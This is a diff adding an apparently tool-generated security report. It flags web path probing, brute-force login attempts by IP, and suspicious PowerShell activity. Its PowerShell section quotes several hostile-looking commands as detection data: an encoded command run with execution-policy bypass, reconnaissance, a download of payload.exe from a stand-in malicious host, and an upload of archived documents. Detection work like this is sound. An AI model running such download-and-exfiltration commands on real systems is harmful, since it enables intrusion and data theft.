@@ -1,0 +1,86 @@
+SECURITY INVESTIGATION REPORT
+Generated: 2026-05-03_18-53-58
+==================================================
+
+Total IOC matches:           14
+Total Auth alerts:           48
+Total PowerShell alerts:     8
+Total findings:              70
+--- IOC Matches ---
+[IOC] Malicious IP detected: 203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+[IOC] Malicious path detected: 203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+[IOC] Malicious IP detected: 203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+[IOC] Malicious path detected: 203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+[IOC] Malicious IP detected: 203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+[IOC] Malicious path detected: 203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+[IOC] Malicious IP detected: 198.51.100.8 - - [15/Jul/2009:15:50:51 -0700] "POST /login HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+[IOC] Malicious IP detected: 198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+[IOC] Malicious path detected: 198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+[IOC] Malicious IP detected: 198.51.100.8 - - [15/Jul/2009:15:50:53 -0700] "GET /wp-login.php HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+[IOC] Malicious IP detected: 198.51.100.8 - - [15/Jul/2009:15:50:54 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+[IOC] Malicious path detected: 198.51.100.8 - - [15/Jul/2009:15:50:54 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+[IOC] Malicious IP detected: 198.51.100.8 - - [15/Jul/2009:15:50:55 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+[IOC] Malicious path detected: 198.51.100.8 - - [15/Jul/2009:15:50:55 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+
+--- Authentication Failures ---
+[Auth] Possible brute-force from IP 85.245.107.41 (11 failed attempts)
+[Auth] Possible brute-force from IP 181.25.206.27 (12 failed attempts)
+[Auth] Possible brute-force from IP 24.151.103.17 (157 failed attempts)
+[Auth] Possible brute-force from IP 181.25.201.155 (8 failed attempts)
+[Auth] Possible brute-force from IP 122.189.198.238 (6 failed attempts)
+[Auth] Possible brute-force from IP 60.187.118.40 (6 failed attempts)
+[Auth] Possible brute-force from IP 42.184.142.151 (6 failed attempts)
+[Auth] Possible brute-force from IP 82.64.2.59 (6 failed attempts)
+[Auth] Possible brute-force from IP 114.32.100.101 (6 failed attempts)
+[Auth] Possible brute-force from IP 123.153.146.183 (6 failed attempts)
+[Auth] Possible brute-force from IP 181.26.186.35 (27 failed attempts)
+[Auth] Possible brute-force from IP 183.152.79.79 (6 failed attempts)
+[Auth] Possible brute-force from IP 1.30.211.144 (6 failed attempts)
+[Auth] Possible brute-force from IP 93.120.176.237 (6 failed attempts)
+[Auth] Possible brute-force from IP 78.106.21.86 (6 failed attempts)
+[Auth] Possible brute-force from IP 112.251.168.248 (6 failed attempts)
+[Auth] Possible brute-force from IP 119.193.140.176 (6 failed attempts)
+[Auth] Possible brute-force from IP 58.19.144.50 (6 failed attempts)
+[Auth] Possible brute-force from IP 49.4.143.105 (40 failed attempts)
+[Auth] Possible brute-force from IP 61.166.73.66 (6 failed attempts)
+[Auth] Possible brute-force from IP 123.96.5.168 (6 failed attempts)
+[Auth] Possible brute-force from IP 111.40.30.206 (6 failed attempts)
+[Auth] Possible brute-force from IP 125.107.136.165 (6 failed attempts)
+[Auth] Possible brute-force from IP 34.204.227.175 (43 failed attempts)
+[Auth] Possible brute-force from IP 223.244.185.76 (6 failed attempts)
+[Auth] Possible brute-force from IP 182.243.87.6 (6 failed attempts)
+[Auth] Possible brute-force from IP 122.190.143.18 (6 failed attempts)
+[Auth] Possible brute-force from IP 61.183.117.250 (6 failed attempts)
+[Auth] Possible brute-force from IP 110.78.174.75 (6 failed attempts)
+[Auth] Possible brute-force from IP 46.89.129.145 (6 failed attempts)
+[Auth] Possible brute-force from IP 103.230.120.26 (6 failed attempts)
+[Auth] Possible brute-force from IP 175.162.187.121 (6 failed attempts)
+[Auth] Possible brute-force from IP 49.84.87.84 (6 failed attempts)
+[Auth] Possible brute-force from IP 183.146.159.20 (6 failed attempts)
+[Auth] Possible brute-force from IP 222.186.56.220 (8 failed attempts)
+[Auth] Possible brute-force from IP 183.93.253.159 (6 failed attempts)
+[Auth] Possible brute-force from IP 122.163.61.218 (30 failed attempts)
+[Auth] Possible brute-force from IP 14.54.210.101 (12 failed attempts)
+[Auth] Possible brute-force from IP 105.101.221.33 (6 failed attempts)
+[Auth] Possible brute-force from IP 181.25.189.115 (6 failed attempts)
+[Auth] Possible brute-force from IP 178.219.248.139 (6 failed attempts)
+[Auth] Possible brute-force from IP 177.38.145.209 (6 failed attempts)
+[Auth] Possible brute-force from IP 46.30.160.83 (6 failed attempts)
+[Auth] Possible brute-force from IP 111.40.166.130 (6 failed attempts)
+[Auth] Possible brute-force from IP 221.194.44.190 (6 failed attempts)
+[Auth] Possible brute-force from IP 179.38.76.250 (6 failed attempts)
+[Auth] Possible brute-force from IP 201.178.81.113 (22 failed attempts)
+[Auth - CRITICAL] Brute-force from KNOWN MALICIOUS IP 198.51.100.8 (10 failed attempts)
+
+--- PowerShell Activity ---
+[PowerShell - Suspicious Execution] Triggered by: ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand'] | 2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+[PowerShell - Reconnaissance] Triggered by: ['whoami'] | 2025-02-01 10:03:01 whoami
+[PowerShell - Reconnaissance] Triggered by: ['ipconfig'] | 2025-02-01 10:03:10 ipconfig
+[PowerShell - Reconnaissance] Triggered by: ['net user'] | 2025-02-01 10:03:44 net user
+[PowerShell - Exfiltration] Triggered by: ['Invoke-WebRequest'] | 2025-02-01 10:03:55 powershell.exe -Command Invoke-WebRequest https://microsoft.com/update.exe
+[PowerShell - Exfiltration] Triggered by: ['Invoke-WebRequest'] | 2025-02-01 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious-site.com/payload.exe
+[PowerShell - Collection] Triggered by: ['Compress-Archive'] | 2025-02-01 10:05:33 powershell.exe -Command Compress-Archive C:\Users\student\Documents\data.zip
+[PowerShell - Exfiltration Chain Detected] Triggered by: ['-Upload', 'Invoke-WebRequest'] | 2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+==================================================
+END OF REPORT
